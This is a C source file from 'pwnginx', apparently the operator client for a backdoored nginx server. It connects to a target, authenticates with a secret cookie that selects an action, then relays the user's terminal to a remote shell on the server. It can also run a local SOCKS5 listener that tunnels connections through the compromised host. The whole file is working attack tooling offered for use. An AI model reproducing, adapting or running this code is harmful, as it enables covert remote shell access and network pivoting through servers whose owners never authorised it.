/*                                 
 *  functions.c - pwnginx functions 
 *  t57root@gmail.com              
 *  openwill.me / www.hackshell.net
 */                           

#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <bits/signum.h>
#include <sys/wait.h>
#include <stdlib.h>
#include <netdb.h>
        
#include <string.h>
#include <sys/time.h>
#include <sys/types.h>
#include <pthread.h>

extern char *ip;
extern char *port;
extern char *password;
extern char *socks5ip;
extern char *socks5port;


int full_send(int fd,void *buf,int size)
{
    int ret,total=0;
    while(size){
        ret=send(fd, buf, size,0);
        total+=ret;
        if(ret<0) return ret;
        size=size-ret;
        buf+=ret;
    }
    return total;
}
 
int full_recv(int fd,void *buf,int size)
{
    int ret,total=0;
    while(size){
        ret=recv(fd, buf, size,0);
        total+=ret;
        if(ret<=0) return ret;
        size=size-ret;
        buf+=ret;
    }
    return total;
}


int init_connection(char *ip,char *port,int function)
{
    int server;
    struct sockaddr_in server_addr;
    server_addr.sin_family      = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr(ip);
    server_addr.sin_port        = htons(atoi(port));
    server = socket( AF_INET, SOCK_STREAM, 0 );
    if(connect( server, (struct sockaddr *) &server_addr,sizeof( server_addr ) )<0){
        perror("[E] Connect failed");
        return 1;
    }

    char *buf = malloc(100);
    memset(buf,0,100);
    sprintf(buf,"GET / HTTP/1.1\r\nHost: %s\r\nCookie: pwnginx=%s; action=%d\r\n\r\n", ip, password, function);
    full_send(server,buf,strlen(buf));
    full_recv(server,buf,9);
    if(strncmp(buf,"pwnginx",7)!=0){
        printf("[E] Cannot get banner\n");
        close(server);
        server = -1;
    }
    free(buf);
    return server;
}

int forwarder(int from,int to)
{
    int rec,sen;
    fd_set rfds;
    char buffer[BUFSIZ+1];
    while(1){
        FD_ZERO(&rfds);
        FD_SET(from, &rfds);
        FD_SET(to, &rfds);
        int bigger = (from>to?from:to)+1;
        if(select(bigger, &rfds, NULL, NULL, NULL)==0)
            continue;
        if(FD_ISSET(from,&rfds)){
            if ((rec = read(from, buffer, BUFSIZ)) > 0){
                sen=write(to, &buffer, rec);
                //printf("%d => %d\n",rec,sen);
                if(sen<=0) {
                    //printf("::1::%d::\n",sen);
                    break;
                }
            }
            else {
                //printf("::2::%d::\n",rec);
                break;
            }
        }
        if(FD_ISSET(to,&rfds)){
            if ((rec = read(to, buffer, BUFSIZ)) > 0){ 
                sen=write(from, &buffer, rec);
                //printf("%d <= %d\n",rec,sen);
                if(sen<=0) {
                    //printf("::3::%d::\n",sen);
                    break;
                }
            }
            else {
                //printf("::4::%d::\n",rec);
                break;
            }
        }
    }
    return 0;
}  

int exec_shell(int fd)
{
    printf("\n\n[i] Enjoy the real world.\n");
    forwarder(STDIN_FILENO,fd);
    close(fd);
    printf("Connection lost\n");
    return 0;
}


int socks5_worker(void *fdptr)
{
    int fd = *(int *)fdptr;
    int srv_fd = init_connection(ip,port,2);
    if(srv_fd<0){
        printf("[E] init_connection failed\n");
        return -1;
    }
    forwarder(fd,srv_fd);
    close(fd);
    close(srv_fd);
    printf("Connection lost\n");
    return 0;
}

int exec_socks5()
{
   
    int sock,csock;

    struct sockaddr_in saddr,caddr;
    saddr.sin_family = AF_INET;
    saddr.sin_addr.s_addr = inet_addr(socks5ip);
    saddr.sin_port = htons(atoi(socks5port));

    sock = socket(AF_INET, SOCK_STREAM, 0);
    int reuse = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(int));
    if(bind(sock, (struct sockaddr *) &saddr, sizeof(saddr))==-1){
        perror("[E] bind error");
        return -1;
    }
    listen(sock, 5);
    int caddr_len=sizeof(caddr);
    printf("[i] Listenning port %d on %s\n",ntohs(saddr.sin_port),inet_ntoa(saddr.sin_addr));
    while((csock = accept(sock,(struct sockaddr *) &caddr,(socklen_t * __restrict__)&caddr_len))){
        printf("[i] Connected from %s\n", inet_ntoa(caddr.sin_addr));
        pthread_t thread;
        if(pthread_create(&thread, NULL, (void *)socks5_worker, (void *)&csock))
        {
            perror("[E] pthread_create failed");
            close(sock);
        }
        else
            pthread_detach(thread);
    }
    return 0;
}
